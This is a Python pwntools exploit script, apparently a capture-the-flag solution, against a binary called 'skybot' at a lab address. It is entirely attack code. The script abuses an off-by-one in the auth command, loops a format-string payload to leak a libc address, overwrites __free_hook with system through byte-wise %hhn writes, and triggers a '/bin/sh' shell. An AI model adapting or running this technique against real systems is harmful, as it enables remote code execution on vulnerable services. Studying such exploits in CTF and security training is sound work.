#!/usr/bin/env python2
# encoding: utf-8

from pwn import *

LOCAL = "remote" not in sys.argv
BINARY = "skybot"

elf = ELF(BINARY)
context.update(binary=elf)
context.log_level = "debug" if "debug" in sys.argv else "info"

LIBC = None
OFFSET_LIBC_BASE_11 = 0x3c3058

OFFSET = 30
USED_OFFSET = OFFSET_LIBC_BASE_11
FREE_HOOK = 0x3c57a8

if LOCAL:
    r = remote("10.13.37.102", 1337)
    __free_hook = FREE_HOOK
else:
    r = remote("10.13.37.102", 1337)

libc = ELF(LIBC) if LIBC else elf.libc

if "gdb" in sys.argv:
    gdb.attach(BINARY, """b *0x31337\nc\nheap_chunks $heap 5""")


def fmt_string(payload):
    r.sendline("send")
    r.readuntil("To: ")
    r.sendline("to")
    r.readuntil("From: ")
    r.sendline("from")
    r.readuntil("Subject: ")
    r.sendline(payload)
    r.readuntil("Subject:\n")

log.info("Off by one in auth...")
r.sendline("auth " + "A" * 40)
r.sendline("auth " + "A" * 1)

log.info("Format string to leak libc...")
for offset in range(100):
    payload = ("%" + str(offset) + "$llx.").ljust(64, "B") + "A" * 16
    fmt_string(payload)
    leak = r.readuntil("\n").split(".BBBBBB")[0]
    print("Offset %d: %s" % (offset, leak))
    if offset == OFFSET:
        libc_leak = int(leak, 16)
    if leak == ("A" * 8).encode("hex"):
        break

log.info("Libc leak (inside vsnprintf): %#x" % libc_leak)
libc.address = (libc_leak - 0x3c3b78)
log.success("libc base: %#x" % libc.address)

target = libc.address + __free_hook
system = libc.symbols["system"]
log.info("Format string to overwrite __free_hook @ %#x with system @ %#x..." % (target, system))

for i in range(8):
    payload = ""

    b = ord(p64(system)[i])
    if b:
        payload += "%" + str(b) + "x"

    payload += "%" + str(offset) + "$hhn"
    payload  = payload.ljust(64, "B")
    payload += p64(target + i) + "\x00" * 8
    print(payload)
    fmt_string(payload)

log.info('Getting shell...')

r.sendline("auth ///////////bin/sh")
r.sendline("reset")
r.interactive()
r.close()

